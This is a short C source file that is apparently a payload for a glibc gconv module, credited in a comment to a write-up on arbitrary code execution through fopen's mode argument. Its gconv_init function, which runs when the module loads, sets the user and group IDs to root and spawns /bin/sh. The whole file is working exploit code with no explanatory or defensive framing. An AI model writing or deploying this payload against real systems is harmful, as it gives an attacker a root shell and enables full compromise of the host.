#include <unistd.h>
#include <stdio.h>

/*
This payload is stolen from
https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/
*/

void gconv() {}

void gconv_init() {
    printf("LOADED!\n");
    setuid(0);
    setgid(0);
    execve("/bin/sh", NULL, NULL);
}